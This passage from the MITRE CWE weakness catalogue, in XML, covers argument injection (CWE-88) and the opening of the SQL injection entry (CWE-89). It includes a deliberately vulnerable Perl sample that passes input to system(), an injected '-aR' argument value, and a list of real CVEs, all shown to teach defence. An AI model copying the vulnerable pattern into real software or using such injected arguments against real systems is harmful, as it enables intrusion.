            <Demonstrative_Example Demonstrative_Example_ID="DX-150">
               <Intro_Text>Consider the following program. It intends to perform an "ls -l" on an input filename. The validate_name() subroutine performs validation on the input to make sure that only alphanumeric and "-" characters are allowed, which avoids path traversal (CWE-22) and OS command injection (CWE-78) weaknesses. Only filenames like "abc" or "d-e-f" are intended to be allowed.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div style="margin-left:1em;">
		    my $arg = GetArgument("filename");<xhtml:br/>
		    do_listing($arg);<xhtml:br/>
		    <xhtml:br/>
		    
		    sub do_listing {<xhtml:br/>
		    <xhtml:div style="margin-left:1em;">
		      my($fname) = @_;<xhtml:br/>
		      if (! validate_name($fname)) {<xhtml:br/>
		      <xhtml:div style="margin-left:1em;">
			print "Error: name is not well-formed!\n";<xhtml:br/>
			return;<xhtml:br/>
		      </xhtml:div>
		      }<xhtml:br/>
		      <xhtml:i># build command</xhtml:i><xhtml:br/>
		      my $cmd = "/bin/ls -l $fname";<xhtml:br/>
		      system($cmd);<xhtml:br/>
		    </xhtml:div>
		    }
		    <xhtml:br/><xhtml:br/>
		    sub validate_name {<xhtml:br/>
		    <xhtml:div style="margin-left:1em;">
		      my($name) = @_;<xhtml:br/>
		      if ($name =~ /^[\w\-]+$/) {<xhtml:br/>
		      <xhtml:div style="margin-left:1em;">
			return(1);<xhtml:br/>
		      </xhtml:div>
		      }<xhtml:br/>
		      else {<xhtml:br/>
		      <xhtml:div style="margin-left:1em;">
			return(0);<xhtml:br/>
		      </xhtml:div>
		      }<xhtml:br/>
		    </xhtml:div>
		    }
		  </xhtml:div>
               </Example_Code>

               <Body_Text><xhtml:p>However, validate_name() allows
               filenames that begin with a "-". An adversary could
               supply a filename like "-aR", producing the "ls -l -aR"
               command (CWE-88), thereby getting a full recursive
               listing of the entire directory and all of its
               sub-directories.</xhtml:p>

	       <xhtml:p>There are a couple possible mitigations for this
	       weakness. One would be to refactor the code to avoid
	       using system() altogether, instead relying on internal
	       functions.</xhtml:p>
			   
	       <xhtml:p>Another option could be to add a "--" argument
	       to the ls command, such as "ls -l --", so that any
	       remaining arguments are treated as filenames, causing
	       any leading "-" to be treated as part of a filename
	       instead of another option.</xhtml:p>
	       
	       <xhtml:p>Another fix might be to change the regular expression used in validate_name to force the first character of the filename to be a letter or number, such as:</xhtml:p>
	       </Body_Text>
	       <Example_Code Nature="Good" Language="Perl">
		 <xhtml:div style="margin-left:1em;">
		   if ($name =~ /^\w[\w\-]+$/) ...
		 </xhtml:div>
	       </Example_Code>
            </Demonstrative_Example>
	    <Demonstrative_Example>
	      <Intro_Text>CVE-2016-10033 / [REF-1249] provides a useful real-world example of this weakness within PHPMailer.</Intro_Text>
	      <Body_Text>The program calls PHP's mail() function to compose and send mail. The fifth argument to mail() is a set of parameters. The program intends to provide a "-fSENDER" parameter, where SENDER is expected to be a well-formed email address. The program has already validated the e-mail address before invoking mail(), but there is a lot of flexibility in what constitutes a well-formed email address, including whitespace. With some additional allowed characters to perform some escaping, the adversary can specify an additional "-o" argument (listing an output file) and a "-X" argument (giving a program to execute). Additional details for this kind of exploit are in [REF-1250].</Body_Text>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-36069</Reference>
               <Description>Python-based dependency management tool avoids OS command injection  when generating Git commands but allows  injection of optional arguments with input beginning with a dash, potentially allowing for code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-36069</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0113</Reference>
               <Description>Canonical Example - "-froot" argument is passed on to another program, where the "-f" causes execution as user "root"</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-0113</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0150</Reference>
               <Description>Web browser executes Telnet sessions using command line arguments that are specified by the web site, which could allow remote attackers to execute arbitrary commands.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0150</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0667</Reference>
               <Description>Web browser allows remote attackers to execute commands by spawning Telnet with a log file option on the command line and writing arbitrary code into an executable file which is later executed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0667</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0985</Reference>
               <Description>Argument injection vulnerability in the mail function for PHP may allow attackers to bypass safe mode restrictions and modify command line arguments to the MTA (e.g. sendmail) possibly executing commands.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0985</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0907</Reference>
               <Description>Help and Support center in windows does not properly validate HCP URLs, which allows remote attackers to execute arbitrary code via quotation marks in an "hcp://" URL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0907</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0121</Reference>
               <Description>Mail client does not sufficiently filter parameters of mailto: URLs when using them as arguments to mail executable, which allows remote attackers to execute arbitrary programs.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0121</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0473</Reference>
               <Description>Web browser doesn't filter "-" when invoking various commands, allowing command-line switches to be specified.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0473</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0480</Reference>
               <Description>Mail client allows remote attackers to execute arbitrary code via a URI that uses a UNC network share pathname to provide an alternate configuration file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0480</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0489</Reference>
               <Description>SSH URI handler for web browser allows remote attackers to execute arbitrary code or conduct port forwarding via the a command line option.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0489</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0411</Reference>
               <Description>Web browser doesn't filter "-" when invoking various commands, allowing command-line switches to be specified.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0411</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-4699</Reference>
               <Description>Argument injection vulnerability in TellMe 1.2 and earlier allows remote attackers to modify command line arguments for the Whois program and obtain sensitive information via "--" style options in the q_Host parameter.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-4699</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-1865</Reference>
               <Description>Beagle before 0.2.5 can produce certain insecure command lines to launch external helper applications while indexing, which allows attackers to execute arbitrary commands. NOTE: it is not immediately clear whether this issue involves argument injection, shell metacharacters, or other issues.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-1865</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2056</Reference>
               <Description>Argument injection vulnerability in Internet Explorer 6 for Windows XP SP2 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via " (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-2056</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2057</Reference>
               <Description>Argument injection vulnerability in Mozilla Firefox 1.0.6 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via " (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-2057</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2058</Reference>
               <Description>Argument injection vulnerability in Avant Browser 10.1 Build 17 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via " (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-2058</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2312</Reference>
               <Description>Argument injection vulnerability in the URI handler in Skype 2.0.*.104 and 2.5.*.0 through 2.5.*.78 for Windows allows remote authorized attackers to download arbitrary files via a URL that contains certain command-line switches.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-2312</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3015</Reference>
               <Description>Argument injection vulnerability in WinSCP 3.8.1 build 328 allows remote attackers to upload or download arbitrary files via encoded spaces and double-quote characters in a scp or sftp URI.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-3015</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4692</Reference>
               <Description>Argument injection vulnerability in the Windows Object Packager (packager.exe) in Microsoft Windows XP SP1 and SP2 and Server 2003 SP1 and earlier allows remote user-assisted attackers to execute arbitrary commands via a crafted file with a "/" (slash) character in the filename of the Command Line property, followed by a valid file extension, which causes the command before the slash to be executed, aka "Object Packager Dialogue Spoofing Vulnerability."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4692</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6597</Reference>
               <Description>Argument injection vulnerability in HyperAccess 8.4 allows user-assisted remote attackers to execute arbitrary vbscript and commands via the /r option in a telnet:// URI, which is configured to use hawin32.exe.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6597</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-0882</Reference>
               <Description>Argument injection vulnerability in the telnet daemon (in.telnetd) in Solaris 10 and 11 (SunOS 5.10 and 5.11) misinterprets certain client "-f" sequences as valid requests for the login program to skip authentication, which allows remote attackers to log into certain accounts, as demonstrated by the bin account.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-0882</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1246</Reference>
               <Description>Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1246</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-13475</Reference>
               <Description>Argument injection allows execution of arbitrary commands by injecting a "-exec" option, which is executed by the command.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-13475</Link>
            </Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2016-10033</Reference>
			  <Description>Argument injection in mail-processing function allows writing unxpected files and executing programs using tecnically-valid email addresses that insert "-o" and "-X" switches.</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2016-10033</Link>
			</Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>System Process</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Argument Injection or Modification</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV03-C</Entry_ID>
               <Entry_Name>Sanitize the environment when invoking external programs</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV33-C</Entry_ID>
               <Entry_Name>Do not call system()</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR02-C</Entry_ID>
               <Entry_Name>Sanitize data passed to complex subsystems</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>30</Entry_ID>
               <Entry_Name>Mail Command Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="137"/>
            <Related_Attack_Pattern CAPEC_ID="174"/>
            <Related_Attack_Pattern CAPEC_ID="41"/>
            <Related_Attack_Pattern CAPEC_ID="460"/>
            <Related_Attack_Pattern CAPEC_ID="88"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-859"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 10, &#34;The Argument Array&#34;, Page 567"/>
            <Reference External_Reference_ID="REF-1030"/>
            <Reference External_Reference_ID="REF-1249"/>
            <Reference External_Reference_ID="REF-1250"/>
         </References>
         <Notes>
            <Note Type="Relationship">At one layer of abstraction, this can overlap other weaknesses that have whitespace problems, e.g. injection of javascript into attributes of HTML tags.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Description, Name, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-23</Modification_Date>
					<Modification_Comment>updated Description, Name, Observed_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
			<Contribution Type="Feedback">
			  <Contribution_Name>Anonymous External Contributor</Contribution_Name>
			  <Contribution_Date>2021-05-28</Contribution_Date>
			  <Contribution_Comment>Identified inappropriate demonstrative example, suggested new observed example, applicable language.</Contribution_Comment>
			</Contribution>
			<Previous_Entry_Name Date="2019-09-19">Argument Injection or Modification</Previous_Entry_Name>
			<Previous_Entry_Name Date="2019-09-23">Improper Delimitation of Arguments in a Command ('Argument Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="89" Name="Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.</xhtml:p>
            <xhtml:p>SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or product package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Database Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This weakness typically appears in data-rich applications that save user inputs in a database.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If poor SQL commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>Just as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with a SQL injection attack.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or do not require any code changes.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke SQL commands, leading to false negatives - especially if the API/library code is not available for analysis.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-9">
               <Method>Manual Analysis</Method>
               <Description>Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>
                  <xhtml:p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</xhtml:p>
                  <xhtml:p>Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using "exec" or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>
